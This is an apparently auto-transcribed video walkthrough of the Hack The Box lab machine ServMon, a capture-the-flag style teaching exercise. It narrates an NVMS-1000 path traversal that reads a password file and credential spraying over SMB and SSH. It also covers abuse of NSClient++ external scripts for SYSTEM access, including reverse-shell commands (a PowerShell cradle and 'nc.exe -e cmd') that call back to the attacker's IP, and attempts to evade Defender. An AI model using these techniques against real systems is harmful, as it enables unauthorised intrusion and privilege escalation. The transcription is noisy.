 what's going on YouTube this is IPS I'm doing serve mom from hack the box which was marked as an easy Windows box so because it's easy we'll be doing this live I haven't done any preparation whatsoever that being said I do some editing around the end of this video because I believe I crashed the box like three or four times trying to do the exploit and just kind of rushing through it not understanding it and it just crashes the box so a little bit frustrating there but there is a learning opportunity because it isn't a custom application this is just a a regular application that people install and exploits don't always tell you how reliable they are how often they'll break a boxer if you do something wrong the Box just will go offline so it's definitely a good learning opportunity there with all that being said let's just jump in as always start off with the end map so Dash SC for default scripts SV or numerate versions OA I'll put all formats and I don't have that nmap directory created so I'll create that and then call this file serve on and then the IP address which is 10 10 10 184 and I'm also going to run this nmap with sudo because since I switched to Parrot I am no longer the root user and nmap just runs better as root I'm also going to add the dash V flag so we see open ports as it does find them because nmap can take a little bit of time I'm also going to do a a sleep 300 and we'll just do an nmap Dash p dash and again run it as root and that's going to do all ports 10 10 10 184 and dash O A we'll call this serve mon all ports uh sleep 300 comma all right colon there we go so looking at this we have port 80. we have Port 22 so 80s HTTP 22 is going to be SSH then we have 135 445 and 139 which is SMB stuff so it's a little bit unique that we have both SMB and SSH running 21 which is going to be FTP 8443 which is most likely https 36.99 which I honestly have no idea what that is and 566 which is most likely um nrpe which is a nogius agent a monitoring application so let's go over to Cherry Tree uh control n we'll call this serve mon control shift n notes make this a bit bigger make this a bit bigger and Oddity we have SMB plus SSH so what's the OS easy way to identify the OS is just to Ping it so if we do ping Dash C1 1010 184 we see the TTL is 127. Windows default TTL is 128 every time you hit a router it decrements by one if we did um trace route on this um we'll get the one hop which documented the TTL which is 10 10 14 1 which is the hack the Box VPN if we ping her local box 127001 the TTL is 64 because there's no router in between us and the default TTL on Linux is 64. this is time to live if I didn't say that so in our notes we can say this is going to be a Windows box based upon TTL so let's go over to Services um HTTP we have 8443 https um what are the ones we had sh FTP and nope which is five six six so these are Services we want to look at I'm going to start with HTTP so let's go and actually let's start with SMB because that's so easy to look at so SMB client Dash U H 10 10 10 184. we probably have to do Dash L to list shares nothing we can try guest and let's try anonymous these are three things I generally try we could try other tools but I'm very fairly confident SMB is locked down so we don't have anything there uh we can go to 10 10 10 184 and we get a page nvms 1000 it says please log in I'm going to try admin password and we get username and password error I'm going to try putting a bunch of special characters see if we can get this air uh username or password error to actually say like SQL injection error is something weird like that so I just put a bunch of special characters in I pressed F12 to open up this developer toolbar and if we take this type equals password out a web browser would no longer obfuscate the characters from us so you can see what I'm sending does a bunch of things that generally induces some type of error message we don't get anything so what I'm going to do send this to reverb and I'm actually going to play with this request changing the language because changing the language for some reason there's a bunch of um just file inclusion type exploits so I'm going to change it to Korean and it's going through brip Suite the other thing I notice is it's a HTM if this was PHP or aspx I may try other things uh this is the detect portal so that's not what we want drop those requests and that is a little unique just how it passed in the cookie I don't know what this 0x0412 thing is and oh God uh let's see that was just more content than I expected but it's just a bunch of script Source I don't know what I was exactly expecting this is the login page um Ctrl shift U H so maybe this is some code that says language and then this dollar means uh what comes after if we change the language to let's go over here proxy for the request and go to German so this language type does change so zero X zero four zero seven this is zero four one two so don't know exactly what that is um we search for German here we don't get anything I think there's a quick way we could test for like um some type of I don't know it wouldn't even be cross-site scripting because this isn't a cookie it's not in the URL so I'm not as interested in this little field anymore uh looks like it's directing us to Germany Germany let's try logging in with admin admin again seeing what this request looks like and we get post do login so maybe this is some type of Java application just because whenever like this naming convention just screams Java to me I'm not sure why it's just something I generally see I also see it doing XML so maybe this could be vulnerable to some type of XML any injection we don't have any user input here right now it looks like a login is in this base64. I just have seen base64 admin enough to know this is admin I mean we can look at this and decoder and decode this as base64 and we see admin admin but it's a bit weird way to handle logins so what I'm actually going to do is send this request uh shift print screen if I can hit print screen button I'm going to select area to grab take screenshot and we will grab this I also want to grab the target and I'm just going to click copy to clipboard we go back to Cherry Tree HTTP and we'll call this um XML login smell entity and just based upon this it would be a huge pain to send to SQL map right now so I'm going to move on and look at other things so because we'd have to do SQL map tell SQL map to go into this header and also use um a tamper script to base64 encoder request I believe so that's a lot more work than I care to do so that's why I'm not going to be using SQL map here oh let's see we could try to do gobuster and find other dot HTM Pages while we look for other things so let's see actually yeah let's do go Buster Go Buster Dash uh we have to do dir for mode uh is it did I copy it I did Dash X HTM that's W for word list user share word list dirtbuster directory list two three medium uh this is Windows so chances are it's not case sensitive so let's turn this off hit this page put some weird casing in here come on return the page while that loads I'm going to look at all these directory lists directory list two three I think small is all lowercase um that's taking an awful long time but in Windows generally you just don't have to be case sensitive because windows isn't really a case sensitive operating system so Dash o we'll call this durabust dash out uh what let's go back to this request we present that doesn't exist 404 not found so return a status code that matches options for non-existing URL I wanted this because we just don't have all the headers foreign let's see this did return 404 so if we get rid of this cookie 404 get rid of this DNT and referral let's get rid of everything but to get I honestly don't know what just happened there um let's see Go Buster Dash h uh Dio Dash h so Dash p is proxy so 127001 8080 and we want to specify http so let's see what request gobuster is doing clear The Intercept Q what unable connect to okay that's what Dash p was proxy let's see Dash p HTTP colon oh we don't need slash slash there we go so get pages and that returns let's return this again maybe it's just time down okay this little Quest is doing it's actually getting a 200 okay here and let's see this is what we want to compare it against see because I thought when we just did this and said nothing was it one we did oh we have HTTP there so that would explain what we were doing wrong so anything in this Pages directory is giving us a 200 okay which is going to make go-bustering it a bit of a pain foreign we're just going to ignore Go Buster for now let's see let's move on and look at something else so nvms we can do searchpoint nvms and we don't have that so at sudo apt install Ed uh is it xydb there it is uh sudo apt update and we can install exploitdb which will give us the search Point command that can take a little while to install so let's try looking at FTP because we haven't done that yet so FTP 1010 184. try anonymous Anonymous you get logged in and we have a user's directory so let's go into Nadine and we can get confidential.txt and let's go into Nathan's and we can get notes to do dot txt get the two files and search point is finished but I mean we got two files so I'm going to make the FTP move confidential and notes to FTP try to stay a little bit organized look at confidential Nathan I left you a passwords.txt file on your desktop please remove this once you have edited it yourself and place it back into the secure folder so let's see on my notes uh let's see I'm gonna put passwords.txt on Nathan's desktop if he's seen it check and secure a folder where is secure folder so that's kind of the question I have after reading that let's look at notes to do so change the password on nvms done lock down the NS client access so NS client this is the windows version of nrpe uh upload the passwords remove public access to nvms and place the secret files in SharePoint um what was this file called to do dot text this is I guess we can call notes to do.tax I think is what its name was um SharePoint so maybe SharePoint is eight four four three ten ten ten one eight four eight four four three get a SSL and this is NS client I'm going to look at this certificate whoa that was weird um the certificate said it's CN was localhost so uh I'm not too concerned looking deep into this certificate not sure what's going on there ah doesn't really give me that much and that is weird uh let's do F12 debugger or console download failed font awesome makes use a shot one not exactly sure what's going on here if I do Ctrl shift R it goes to this page if I do F5 same thing not a page so let's try a different browser real quick um chromium and paste and we get a login form try password Here I'm not allowed password can be found by running this command so I'm going to press shift print screen take screenshot and copy to clipboard let's do https I'll just call this NS client and paste that close that out and let's go back to search point I want to close this tab search point and VMS we get a directory traversal Dash X to examine paste let's see get oh it's just vulnerable to lfi right there so we can go back to burp Suite get a bunch of dot dot slashes foreign and it was going in what was it Windows slash win.ini and we can see we can include this file so going back to our notes uh passwords.txt is on Nathan's desktop so let's try users Nathan ntuser dot data and we get 404 not found this is just a file that's normally in um Windows directories uh we can also try users Nathan for if we're not found desktop passwords.txt and we get the file so I would examine like your windows home folder on your desktop and look at all the hidden files because those files may have interesting things that are good ways to just pull information I think ntuser.data off top my head has like recently opened files so that would just be super handy to have if you're on like an actual engagement but let's do the passwords.txt these in and we can delete these blank lines uh smooth stud uh what's not removed MV stud Dot will do serve mon Dash stir and to end map when I did the all puts I guess I just uh fuboted a little bit and didn't put in the directory uh let's do passwords and we can do uh let's where's rename is it F2 call this creds passwords users there's Nathan and was it Nadine I think that was the other user so let's go see we're here so we can try crack map exec let's go look at FTP again FTP 1010 182 should have taken notes of it's 184 of the users uh Nadine so I got that right V users.txt Nathan Nadine and now we can do crack map exec SMB 1010 10 184 Dash U H user.tax dash p passwords.txt so we can try logging in with SMB on all of these guys and we get one we don't have the pound so this user is not an admin but we may be able to see like file shares so let's do SMB client Dash U Nadine uh Dash capital l 10 10 10 184 copy this paste and we don't really have any access so let's see copy oh it's just do this and then shift print screen take screenshot of this copy the clipboard and this was I think Nadine's let's see yeah that was in Deans so I like taking screenshots of the exact moment I got the password just because I mean if I do a screen uh report it does help so I still I don't have her password here it was this like big butt set work password so let's see let's go back into the nmap oh we had SSH so we can go back to that crack map exec replace smv with SSH whoops we could probably just try it whoa error let's do [Music] weird uh let's do users does not like file name for well that is a weird bug so if I give it a file and this uses dot text we get a weird error message yeah so I should update crack map exec and see if that exists still but looks like we have a hit for Nadine it doesn't say pound but SSH on Windows is a bit unique so maybe it just doesn't have that yet let's try SSH Nadine at 10 10 10 184. yes to accept the fingerprint uh let's make sure I copied this correctly paste it in and we're on the box so let's see we can do system info to get some information about this uh we also have the Microsoft version right here I don't know exactly what this is but I bet if we Google this we can get the version the system info failed us see that seems oddly specific c o s come on probably windows 10. doesn't say like 2019 or something so we could go Googling around to try to find out exactly what Windows version this is but I don't think that's going to be too helpful so what we probably want to do I guess when we do um get root on the box we can do system info to see if this is actually Windows 10 or a Windows Server platform um but we can probably log into that NVM and even if we can't we may be able to drop a file let's find out if it's like um how the application works drop a file execute it and get access as NT service which then we could potentially use like Rogue potato or something to prevask um let's see what juicy potato or any of those potatoes there's inet Pub let me look at this it's just FTP what's Rec data I don't know what that folder is record info db3 so that's probably this NVM thing and based upon this I'm guessing it's a webcam recorder thing uh let's see we can go into program files we got NS client so we could also look at that password and configuration but right now we are a hunt for this NVM application progress2 here it is nvms 1000 and you should always go and grab the configuration files of web servers because oftentimes there's secrets in them that lets you just get code execution on the box persistent maybe they reuse passwords just configuration files of web servers in general or a gold mine uh let's see there's basic config it's not that uh web uh let's do index HTM index .htm had a habit I did HTML it's in login.htm pages what CD pages this oh this goes to like do login this is gonna be a pain I was looking forward to like pull a configuration file but it doesn't look like it's doing that uh local parameters yeah 6063 so this that 6699 is probably some type of port for this nvms application if I do netstat an L or ANP an we don't get um the PID because we're not admin we can see it talking back to me on this 6699 quite a bit though close weight though so it's probably my end map so let's take a look at the nagios config foreign let's see progo one NS client plus plus type nsclient.ini so we got allow arguments equals true I think this is similar to like don't blame nrpe for nrpe meaning if you give the agent an argument it will actually treat it and execute it which is cool so don't blame NRP is a dangerous flag Aslam I believe allow arguments is a dangerous flag as well so if you don't know what this tool is essentially it's an agent that deploys on all your boxes and the server connects to the agent and says hey run this pre-configured command and give me the output of it and it's used to determine the health so um allow arguments means you can kind of go off script and just give it anything you want and then it executes it and reports back essentially so if it's pre-configured and they can only execute this batch script with no external arguments it's not really that big of a security risk but when you can give them anything you want it can be and the security around it is they don't have authentication they have this allowed host thing so only the host 127001 can um access it uh undocumented key and this base64 so let's do Echo dash n maybe that's not base64. or maybe NS client does some weird like xor on this so copy this NS client oh I already had an NS client oh we want to run this command say this is why you take notes I forgot I all about that uh let's see there's probably been uh let's see is it NS client nsap.exe it's right here web inar space there password display hey current password so it's not base64 to encoded or anything it's just this so we can add user add roles do all sorts of things from this awesome uh taking notes definitely definitely does help so let's try logging into this so copy Chrome again and we still get this 403 not allowed so what I'm going to do what I did if the very first thing you type on a line is that squiggly C you enter SSH um command mode so I'm going to hit enter that's Quigley C l 8443 127001 8443 I type fast and I talk so do that and now on our box we listened on Port 8443 and it went through this SSH connection and then sends the request to 127001-8443 so now if I do 127001 8443 specify https we get NS client so we can paste the password in and we log in so let's see let's go to nfpe Scripts add a simple script so let's do Please Subscribe as the Alias the command C trying to think if this would be Powershell and then we do arguments here or we just do everything here let's try that is weird I don't know what that scripts powershell.ps1 is uh CD Scripts type powershell.ps1 ah I wonder if this is put it by the Creator the date is 2017. so probably not everything is not going to be fine if you execute the script um that's funny uh let's do I want to search blade has anything for this real quick searchpoint NS client authenticated remote code execution God string python and probably hitting like the API or something why does it make it so complicated let's see privilegation so with web server password okay set a planner command add a schedule restart foreign and we will do arguments Dash encoded command and let's do ping first so Echo ping 10 10 14 2. M1 and then I convert to utf-16 little endian base64-w0 so this Powershell command should ping us save okay pseudo TCP dump Dash I ton zero icmp and we can also test this with this okay it does work [Music] let's go queries see scheduler thank you I think we're doing something wrong advanced foreign let's see let's look at this again so we did the scripts and settings scheduler schedules add new I didn't see an interval so let's try this again add new section schedules that's fine key uh Powershell I'll call this please subscribe value Powershell Dash encoded command and where is that encoded command ah here it is copy paste add okay where's the interval uh always save oh reload reload control so it's restarting hopefully when this restarts we'll probably see like Please Subscribe down here instead of default and that may let us do what we want I don't know what this value is supposed to be settings scheduler schedules foreign once we uh reload the config maybe we've had a bad configure there and hung the Box I'm gonna give it like five ten more seconds than revert let's see do I store my SSH connection dir I do so I'm guessing the service died uh get service and that's client get services um forget the service command on Windows I said get service was a thing I guess not stat Dash an at least not no longer listing on that port one-time weight state so one of it's waiting for these sockets to die before it starts back up I think we're just going to revert the Box so let's clean our sessions up and we will redo this so let's see copy cherry tree get to start to whatever ping payload creds this is going to be let's see do I have it's probably on the other pane password so this is not use and we're at Nadine foreign the Box leave that one up okay so hold on I'll revert and then we will try this again the Box should be reverted and the last piece of information we need before we can ssh in is the password so we need to copy that and Sh Dash l8443 127001-8443 Nadine at ten ten ten eighty ten ten ten one eighty four paste the password in there copy run that sh command grab the password while it's loading SSH paste it there we go so now we should go back to Chrome and again you want to use Chrome not Firefox because Firefox really does not like this page so loading it we click on settings we should get the uh error message or login prompt come on there we go so let's go back here copy an obvious password and login so we're logged in now and I'm going to jump ahead a lot because I've attempted to do this like three times probably like five times actually every time I'm recording it doesn't work and every time I'm not recording it works so I'm thinking it may be time related so I click settings external script scripts I'm going to give this the name please sub and the command is gonna or the key is going to be command I'm gonna do SQL and backslash temp backslash please sub dot bat Okay click add Click Change save configuration and if this works we'll go over exactly what I was doing prior so click restart and looks like maybe it worked we go to queries come on it's loading uh let's put the password in again and we got it okay so a lot of times when I was clicking this reload it would actually crash and not come back so maybe it's me walking through the cve that does that but we got this here so that's what we needed um going back uh what I was showing before the Box kept not coming back on me was we stepped through this very carefully so we look at step two and want to make sure both these scripts are enabled and these are enabled at the start so if you clicked on modules you would see check external scripts and scheduler is enabled and the next thing it wants us to do is download netcat and upload it to the Box we're not going to do that we'll go to CD backslash temp and just Echo Powershell Dash and C go over here put a ping payload and we'll put this as please sub.bat is I think what we called it Stone TCP Dom so now if we execute please sub.that we get that so if we go to settings external scripts and this is where I was having trouble before we reverted the box is I clicked on default add new and did some stuff and this add new is not actually add new script it is add new value so this default has a bunch of these values so if we did add new put a key as um Please Subscribe and hate this interface I guess we do add we go back to Advanced and we got this uh value Please Subscribe and hate this interface so this interface being this NS client so that's what I have here we have this please sub and the command is going to execute this Powershell script so the actual cve or not CBE the exploit DB script has a screen a scheduled task to execute this file every minute but you can just go to queries go to your query and then go to run and run this we can see did that powershell-enc and looking at this we get the Ping the second one and we can see the output so we know that happened we could if we really wanted to do this again click run and boom so the next step is to uh get a reverse shell so I think nishang is user share machine and we can do shells I'm going to copy the reverse TCP one line and hopes that we can put it on a um encoded command line if we didn't did the normal one this is too big and we wouldn't be able to uh do it if that makes sense uh it wouldn't work in the dash ENC because it would just be way too long so let's do invoke one line and we have to choose which one we want um we'll do this one first this doesn't work we'll try the other one so 10. 10 14. 2 put 9001 I'm looking through I think that's all we need data so we can do cat this to I convert Target UTF 16 little Indian base64-w0 so this Barrel shell encoded command should be what we need so Echo Powershell Dash ENC 2 please sub.bat nclvmp 9001 go back here run foreign works does this give us any output has been blocked by an anti-virus so it doesn't like this so let's look at this one line what can we rename um SM so I just did slash SM to highlight all instances 90 percent s SM um please sub replace SM with play sub okay and then let's see I should be fine let's just try that maybe the flag was just on that one line so let's copy this Powershell Dash ENC paste that antivirus blocked it still okay so it's not that line see read slash dollar D percent s dollar D uh this will be like this video we can try this again we're just trying to figure out oh wait a second shoot we got a dollar D here um like this video I want to say we have to do that eventually we'll just switch scripts if changing this is too much of a headache antivirus is still blocking it so let's see now the next step is do it in smaller segments so Echo dash n Icom tutf 16 little Indian we could probably use like invoke obfuscation or something and get around it this way or that way Powershell and see paste so it definitely has an issue with this very start this new object net socket web client git stream line which I don't know how we could actually break up um let's see invert Powershell TCP okay and now please sub is equal to please sub dot get stream so that gonna work that is ugly and probably won't work but don't know if we don't try yeah Echo hi comfy utf-16 little Indian b64 again copy Powershell hey did not work still blocking by antivirus so let's try the other invoke option so CP uh user share Machine and we'll do shells invoke Powershell TCP one line dot PS1 and this may still not work it's funny um this is exactly what I just did essentially so let's get this I know I didn't edit the IP but if it gets to that point we know we did a good job so Powershell and C paste give it a second and it's blocked by antivirus so let's see maybe just time to do an IEX call off a server it's probably the dash ENC option with like the system net sockets TCP client so let's go away from going fancy and simplify it a little bit invoke Powershell tcp.ps1 and let's get rid of all the description I just did everything between the um pound sign and then greater than less than so let's see probably should rename this invoke Powershell TCP two please subscribe okay there's one thing I want to grab less had a dash reverse flag this is what I want to go back in mine Please Subscribe Dash reverse 9001. 10 10 14 2. so now I'm just putting this in a www directory so I can host it easy we'll call it show.ps1 python3 Dash M HTTP server now IEX new object net.web client download string http 10 10 14 2. 8 000 shell.ps one NCL VMP 9001 run it Powershell and wow that didn't even make that IEX request like my web server didn't get anything that is bizarre chocolate dot PS1 yeah it really doesn't like that IX does not like that one bit wow so I'm just going to go do the netcat thing because I am at a loss on how to evade that live that is a weird behavior of the um Defender so locate nc.exe do we have it we do CP dub dub dub curl 10 10 14 2. 8000 nc.exe Dash o n c dot EXE so now we should be able to do nclvmp 9001 nc.exe Dash e CMD 10 10 14 2 9001. is that the correct syntax it is so Echo nc.execmd 10 10 14 2 9001 to please sub dot that okay let's try this so click run uh nc.exe not a recognize command C colon backslash temp backslash nc.exe we may have to do double backslashes there no we don't so who am I we're anti-authority system so we can go CD users see the administrator desktop and get the flag so that is the Box hope you guys enjoyed it sorry for all the mess um sometimes doing it live even on easy boxes runs into difficulties I'm still baffled by that Defender flag in that IEX command before I even um get a call back on the web server so we'd probably have to do a completely different way of Dowling a script then new object net.web client um one of those a quick thing let's see search this on Google uh system.net.web client let's try that real quick run this it's thinking nope still not work so it really does not like this new object thing and this could just be like Powershell in constrained mode and early implementation of it where instead of telling us it's in constrained mode it says everything is malicious when we're trying to do this I'm not sure but that is the Box hope you guys enjoyed it take care and I will see you all next week